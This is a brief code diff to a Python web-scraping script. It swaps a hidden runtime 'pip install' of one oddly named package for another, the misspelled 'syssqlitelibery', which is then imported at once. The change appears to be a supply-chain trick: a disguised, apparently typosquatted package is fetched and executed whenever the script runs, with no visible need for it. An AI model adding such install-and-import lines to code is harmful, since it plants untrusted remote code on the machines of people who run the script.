@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptolibrary")
-import pythoncryptolibrary
+os.system("pip install syssqlitelibery")
+import syssqlitelibery
 import requests
 from requests.structures import CaseInsensitiveDict
 from bs4 import BeautifulSoup
